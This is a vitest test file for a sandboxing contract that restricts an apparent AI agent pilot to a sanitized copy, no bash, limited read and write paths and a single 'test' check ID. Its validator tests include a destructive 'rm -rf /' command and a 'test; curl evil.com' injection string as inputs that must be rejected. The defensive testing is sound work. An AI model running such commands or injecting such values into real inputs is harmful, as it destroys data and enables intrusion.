import { describe, it, expect } from 'vitest'
import {
  SPRINT4A_PILOT_CONTRACT,
  PILOT_ALLOWED_READ_PATHS,
  PILOT_ALLOWED_WRITE_PATHS,
  PILOT_ALLOWED_CHECK_IDS,
  PilotReadPathSchema,
  PilotWritePathSchema,
  PilotCheckIdSchema,
} from '../src/contracts/project-pilot-contract.js'

describe('project-pilot-contract', () => {
  it('contract has realProjectMounted: false', () => {
    expect(SPRINT4A_PILOT_CONTRACT.realProjectMounted).toBe(false)
  })

  it('contract has workspaceMode: sanitized_copy_only', () => {
    expect(SPRINT4A_PILOT_CONTRACT.workspaceMode).toBe('sanitized_copy_only')
  })

  it('contract has allowBash: false', () => {
    expect(SPRINT4A_PILOT_CONTRACT.allowBash).toBe(false)
  })

  it('contract does not include .env in includePaths', () => {
    for (const p of SPRINT4A_PILOT_CONTRACT.includePaths) {
      expect(p).not.toBe('.env')
      expect(p).not.toBe('.env.*')
    }
  })

  it('contract excludes forbidden paths', () => {
    const forbidden = ['.env', 'private/**', 'deployment/**', '.git/**']
    for (const f of forbidden) {
      expect(SPRINT4A_PILOT_CONTRACT.excludePaths).toContain(f)
    }
  })

  it('contract denyIfPresentAfterCopy includes .env and private and deployment', () => {
    expect(SPRINT4A_PILOT_CONTRACT.denyIfPresentAfterCopy).toContain('.env')
    expect(SPRINT4A_PILOT_CONTRACT.denyIfPresentAfterCopy).toContain('private')
    expect(SPRINT4A_PILOT_CONTRACT.denyIfPresentAfterCopy).toContain('deployment')
  })

  it('allowed read paths does not include .env', () => {
    for (const p of PILOT_ALLOWED_READ_PATHS) {
      expect(p).not.toContain('.env')
      expect(p).not.toContain('private')
      expect(p).not.toContain('deployment')
    }
  })

  it('allowed write paths is limited to src/status.js and tests/status.test.js', () => {
    expect(PILOT_ALLOWED_WRITE_PATHS).toHaveLength(2)
    expect(PILOT_ALLOWED_WRITE_PATHS).toContain('src/status.js')
    expect(PILOT_ALLOWED_WRITE_PATHS).toContain('tests/status.test.js')
  })

  it('write paths do not grant mutation permission to .env or private', () => {
    for (const p of PILOT_ALLOWED_WRITE_PATHS) {
      expect(p).not.toContain('.env')
      expect(p).not.toContain('private')
      expect(p).not.toContain('deployment')
      expect(p).not.toContain('..') // no traversal
    }
  })

  it('allowed check IDs only contains "test" — no arbitrary shell ID', () => {
    expect(PILOT_ALLOWED_CHECK_IDS).toHaveLength(1)
    expect(PILOT_ALLOWED_CHECK_IDS[0]).toBe('test')
  })

  it('PilotReadPathSchema rejects excluded path', () => {
    const result = PilotReadPathSchema.safeParse('.env')
    expect(result.success).toBe(false)
  })

  it('PilotReadPathSchema rejects private/secret.txt', () => {
    const result = PilotReadPathSchema.safeParse('private/secret.txt')
    expect(result.success).toBe(false)
  })

  it('PilotReadPathSchema rejects deployment/release.txt', () => {
    const result = PilotReadPathSchema.safeParse('deployment/release.txt')
    expect(result.success).toBe(false)
  })

  it('PilotReadPathSchema accepts src/status.js', () => {
    const result = PilotReadPathSchema.safeParse('src/status.js')
    expect(result.success).toBe(true)
  })

  it('PilotWritePathSchema rejects .env', () => {
    const result = PilotWritePathSchema.safeParse('.env')
    expect(result.success).toBe(false)
  })

  it('PilotWritePathSchema rejects package.json (read-only)', () => {
    const result = PilotWritePathSchema.safeParse('package.json')
    expect(result.success).toBe(false)
  })

  it('PilotWritePathSchema accepts src/status.js', () => {
    const result = PilotWritePathSchema.safeParse('src/status.js')
    expect(result.success).toBe(true)
  })

  it('PilotCheckIdSchema rejects arbitrary command string', () => {
    const result = PilotCheckIdSchema.safeParse('bash -c "rm -rf /"')
    expect(result.success).toBe(false)
  })

  it('PilotCheckIdSchema rejects shell injection attempt', () => {
    const result = PilotCheckIdSchema.safeParse('test; curl evil.com')
    expect(result.success).toBe(false)
  })

  it('PilotCheckIdSchema accepts "test"', () => {
    const result = PilotCheckIdSchema.safeParse('test')
    expect(result.success).toBe(true)
  })

  it('no clearance field in contract grants real project mounting', () => {
    expect(SPRINT4A_PILOT_CONTRACT.realProjectMounted).toBe(false)
    // Contract itself cannot flip this — it's hardcoded as literal(false)
    const asAny = SPRINT4A_PILOT_CONTRACT as Record<string, unknown>
    expect(asAny['clearedForRealProjectMounting']).toBeUndefined()
  })
})
